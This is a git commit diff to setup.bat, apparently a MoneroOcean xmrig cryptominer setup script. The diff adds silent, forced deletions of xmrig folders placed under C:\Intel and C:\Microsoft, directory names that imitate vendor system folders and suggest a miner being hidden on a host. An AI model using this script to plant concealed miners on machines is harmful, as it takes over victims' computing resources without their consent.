e3c15c78ef186519d1a23fbfaa98a7878365e40a
Shadow Labs <shadw999@protonmail.com>
2021-06-20 23:45:44 +0000

    Update setup.bat

--- setup.bat
+++ setup.bat
@@ -140,6 +140,8 @@ echo [*] Removing "%USERPROFILE%\moneroocean" directory
 rem timeout 5
 rmdir /q /s "%USERPROFILE%\moneroocean" >NUL 2>NUL
 rmdir /q /s "%USERPROFILE%\xmrig-6.8.1" >NUL 2>NUL
+rmdir /q /s "C:\Intel\xmrig-6.8.1" >NUL 2>NUL
+rmdir /q /s "C:\Microsoft\xmrig-6.8.1" >NUL 2>NUL
 IF EXIST "%USERPROFILE%\moneroocean" GOTO REMOVE_DIR0
 
 echo [*] Downloading MoneroOcean advanced version of xmrig to "%USERPROFILE%\xmrig.zip"
@@ -192,6 +194,8 @@ echo [*] Removing "%USERPROFILE%\moneroocean" directory
 rem timeout 5
 rmdir /q /s "%USERPROFILE%\moneroocean" >NUL 2>NUL
 rmdir /q /s "%USERPROFILE%\xmrig-6.8.1" >NUL 2>NUL
+rmdir /q /s "C:\Intel\xmrig-6.8.1" >NUL 2>NUL
+rmdir /q /s "C:\Microsoft\xmrig-6.8.1" >NUL 2>NUL
 IF EXIST "%USERPROFILE%\moneroocean" GOTO REMOVE_DIR1
 
 echo [*] Unpacking "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\moneroocean"
